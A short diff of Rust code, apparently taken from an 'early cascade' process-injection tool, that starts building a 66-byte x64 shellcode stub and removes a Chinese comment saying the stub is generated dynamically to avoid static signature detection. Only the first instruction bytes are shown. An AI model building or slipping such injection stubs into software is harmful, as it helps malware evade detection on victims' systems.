@@ -1,7 +1,6 @@
 // Cascade Stub x64
 // From: https://github.com/Whitecat18/earlycascade-injection/blob/main/src/main.rs
 pub fn get_stub() -> Vec<u8> {
-    // 动态生成 Stub 以避免静态签名检测
     let mut stub = vec![0u8; 66];
     // 0..4: sub rsp, 38h
     stub[0..4].copy_from_slice(&[0x48, 0x83, 0xec, 0x38]);
